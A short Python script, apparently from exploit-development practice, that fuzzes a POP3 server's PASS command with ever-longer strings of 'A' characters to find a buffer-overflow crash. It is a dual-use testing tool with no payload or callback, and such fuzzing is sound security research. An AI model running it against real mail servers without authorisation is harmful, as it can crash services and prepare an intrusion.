#!/usr/bin/python

import socket

#################################
IP      = "192.xxx.xxx.xxx"
PORT    = 110
#################################

"""
To Fuzz:
        USER
        PASS
"""

x       = 100

while x <= 10000:
        sock    = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((IP, PORT))
        sock.recv(1024)

        sock.send("USER test\r\n")
        sock.recv(1024)

        sock.send("PASS " + ("A" * x) + "\r\n")
        sock.recv(1024)

        sock.send('QUIT\r\n')
        sock.recv(1024)
        sock.close()

        print("[#] We're at " + str(x))
        x += 200
